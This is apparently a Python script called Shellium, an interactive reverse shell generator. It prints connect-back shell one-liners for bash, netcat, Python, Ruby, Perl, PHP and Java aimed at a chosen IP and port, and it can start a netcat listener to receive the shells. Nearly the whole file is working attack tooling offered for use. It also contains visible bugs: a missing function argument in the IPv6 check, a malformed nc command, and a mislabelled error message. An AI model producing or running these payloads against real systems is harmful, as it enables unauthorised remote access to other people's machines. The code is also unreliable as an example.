from subprocess import call
import os
import socket

# Made by K-S3curity
# Twitter : @KS3curity
# Github : https://github.com/K-S3curity
# If you have any problems or issues with this script, please open an issue on Github
# Help me improve this script by contributing or giving a star


# Colors

class ANSI():
    def green_color():
        return "\33[92m"

    def red_color():
        return "\33[91m"

    def white_color():
        return "\33[37m"

    def yellow_color():
        return "\33[93m"

    def blue_color():
        return "\33[94m"
    
    def cyan_color():
        return "\33[36m"


# Reverse Shells

def bash_rs():
    print(ANSI.white_color() + "\n You selected JBash Reverse Shell. Output : ")
    bash = ANSI.yellow_color() + "bash -i >& /dev/tcp/" + ip_addr + "/" + port + " 0>&1"
    print(bash)

def netcat_rs():
    print(ANSI.white_color() + "\n You selected Netcat Reverse Shell. Output : ")
    netcat = ANSI.yellow_color() + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip_addr + " " + port + " >/tmp/f"
    print(netcat)

def python_rs():
    print(ANSI.white_color() + "\n You selected Python Reverse Shell. Output : ")
    python = ANSI.yellow_color() + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_addr +"\"," + port +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    print(python)

def python3_rs():
    print(ANSI.white_color() + "\n You selected Python3 Reverse Shell. Output : ")
    python3 = ANSI.yellow_color() + "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_addr +"\"," + port +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    print(python3)

def ruby_rs():
    print(ANSI.white_color() + "\n You selected Ruby Reverse Shell. Output : ")
    ruby = ANSI.yellow_color() + "ruby -rsocket -e'f=TCPSocket.open(\"" + ip_addr + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    print(ruby)

def perl_rs():
    print(ANSI.white_color() + "\n You selected Perl Reverse Shell. Output : ")
    perl = ANSI.yellow_color() + "perl -e 'use Socket;$i=\"" + ip_addr + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    print(perl)

def php_rs():
    print(ANSI.white_color() + "\n You selected PHP Reverse Shell. Output : ")
    php = ANSI.yellow_color() + "php -r '$sock=fsockopen(\"" + ip_addr + "\"," + port +");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    print(php)

def java_rs():
    print(ANSI.white_color() + "\n You selected Java Reverse Shell. Output : ")
    java = ANSI.yellow_color() + """r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/""" + ip_addr + """/""" + port + """;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    """
    print(java)


# Reverse Shell generating menu & IP address verification

global menu
def menu():
    print("Choose the Reverse Shell you want to generate : ")
    print(ANSI.cyan_color() + """
    1 - Bash Reverse Shell
    2 - Netcat Reverse Shell (Requires Netcat on the target machine)
    3 - Python2 Reverse Shell
    4 - Python3 Reverse Shell
    5 - Ruby Reverse Shell
    6 - Perl Reverse Shell
    7 - PHP Reverse Shell
    8 - Java Reverse Shell
    Type "exit" to quit the program.
    """)
    choice = input("Enter a number to generate a Reverse Shell > ")
    
    if choice == "exit":
            print("Quitting ...")
            quit()

    if not 0 < int(choice) <= 8:
        print(ANSI.red_color() + "[-] Invalid choice !")
        quit()
    
    global ip_addr
    global port
    ip_addr = input(ANSI.blue_color() + "[*] Enter your IP Address > ")
    port = input(ANSI.blue_color() + "[*] Enter a port number > ")
    

    def check_ipv4_address():
        parts = ip_addr.split('.')
        if len(parts) != 4:
            print(ANSI.red_color() + "[-] Invalid IPv4 Address ! The format must be like ; a.b.c.d")
            quit()
        if '' in parts or ' ' in parts:
            print(ANSI.red_color() + "[-] Invalid IPv4 Address ! No spaces or blank caracters allowed.")
            quit()
        for item in parts:
            if not item.isnumeric():
                print(ANSI.red_color() + "[-] Invalid IPv4 Address ! No special caracters allowed.")
                quit()

        invalid = ['000', '001', '002', '003', '004', '005', '006', '007', '008', '009',
                   '010', '011', '012', '013', '014', '015', '016', '017', '018', '019', 
                   '020', '021', '022', '023', '024', '025', '026', '027', '028', '029', 
                   '030', '031', '032', '033', '034', '035', '036', '037', '038', '039', 
                   '040', '041', '042', '043', '044', '045', '046', '047', '048', '049', 
                   '050', '051', '052', '053', '054', '055', '056', '057', '058', '059', 
                   '060', '061', '062', '063', '064', '065', '066', '067', '068', '069', 
                   '070', '071', '072', '073', '074', '075', '076', '077', '078', '079', 
                   '080', '081', '082', '083', '084', '085', '086', '087', '088', '089', 
                   '090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
        for item in parts:
            if item == item in invalid:
                print(ANSI.red_color() + "[-] Invalid IPv4 address ! Zeros are not allowed at the beginning of the numbers")
                quit()
    
        if 0 <= int(parts[0]) <= 255 and 0 <= int(parts[1]) <= 255 and 0 <= int(parts[2]) <= 255 and 0 <= int(parts[3]) <= 255:
            print(ANSI.green_color() + "[+] " + ip_addr + " is a valid IPv4 address")
            check_port()
    
        else:
            print(ANSI.red_color() + "[-] Invalid IPv4 Address ! The allowed port range is : 0 - 255")
            quit()


    def check_ipv6_address(ip_addr):
        try:
            socket.inet_pton(socket.AF_INET6, ip_addr)
            print(ANSI.green_color() + "[+] " + ip_addr + " is a valid IPv6 address")
            check_port()

        except socket.error:
            print(ANSI.red_color() + "[-] Invalid IPv6 address !")
            quit()


    def check_port():
        if not port.isnumeric() :
            print(ANSI.red_color() + "[-] Invalid Port ! No spaces or blank/special caracters allowed.")
            quit()
        elif not 0 <= int(port) <= 65535:
            print(ANSI.red_color() + "[-] Invalid Port ! The allowed port range is : 0 - 65535")
            quit()
        else:
            print(ANSI.green_color() + "[+] " + port + " is a valid port")

    if ":" in ip_addr:
        check_ipv6_address()
    else:
        check_ipv4_address()

    choice = int(choice)
    if choice == 1:
        bash_rs()
    elif choice == 2:
        netcat_rs()
    elif choice == 3:
        python_rs()
    elif choice == 4:
        python3_rs()
    elif choice == 5:
        ruby_rs()
    elif choice == 6:
        perl_rs()
    elif choice == 7:
        php_rs()
    elif choice == 8:
        java_rs()
    

# Shellium's main menu

def main_menu():
    #Clear the screen

    if 'nt' in os.name:
        call("cls")
    else:
        call("clear")

    try:
        print("""
        Welcome to Shellium, an interactive Reverse Shell generator !
        Choose an option:
        1 - Generate a Reverse Shell
        2 - Listen for connections
        """)
        choice = input("Type 1/2 > ")
        choice = int(choice)
    except KeyboardInterrupt:
        print(ANSI.yellow_color() + "\nProcess manually aborted by user")
        quit()
    
    # Netcat Listener 

    def listen():
        try:
            port = input("Specify a local port > ")
            if not 0 <= int(port) <= 65535:
                print(ANSI.red_color() + "[-] Invalid port ! The allowed port range is 0-65535")
                quit()
            if not 1024 <= int(port):
                print(ANSI.yellow_color() + "You've entered a port number below 1024. Ports between 0 and 1024 are reserved to daemons (System services). \nTo listen on the port you specified, you must run Shellium as root.")
                port = input(ANSI.white_color() + "Change port number ? y/N > ")
                if port == "y" or port == "Y":
                    port = input("Specify a local port > ")
                    if not 1024 <= int(port) <= 65535:
                        print(ANSI.yellow_color() + "\nRe-run Shellium as root to continue")
                        print(ANSI.yellow_color() + "Quitting ...")
                        quit()
                elif port == "N" or port == "n":
                    print(ANSI.yellow_color() + "\nRe-run Shellium as root to continue")
                    print(ANSI.yellow_color() + "Quitting ...")
                    quit()
                else:
                    print(ANSI.red_color() + "[-] Invalid entry ! Quitting ...")
                    quit()
            
            nc = "nc -nlvp" + port
        except KeyboardInterrupt:
            print(ANSI.yellow_color() + "\nProcess manually aborted by user")
        
        try:
            ANSI.green_color(call(nc,shell=True))
        except KeyboardInterrupt:
            print(ANSI.yellow_color() + "\nProcess manually aborted by user")
    
    def generate():
        try:
            menu()
        except KeyboardInterrupt:
            print(ANSI.yellow_color() + "\nProcess manually aborted by user")

    if choice == 1:
        generate()
    elif choice == 2:
        listen()
    else:
        print(ANSI.red_color() + "[-] Invalid option ! Please choose 1/2.")
        quit()

main_menu()
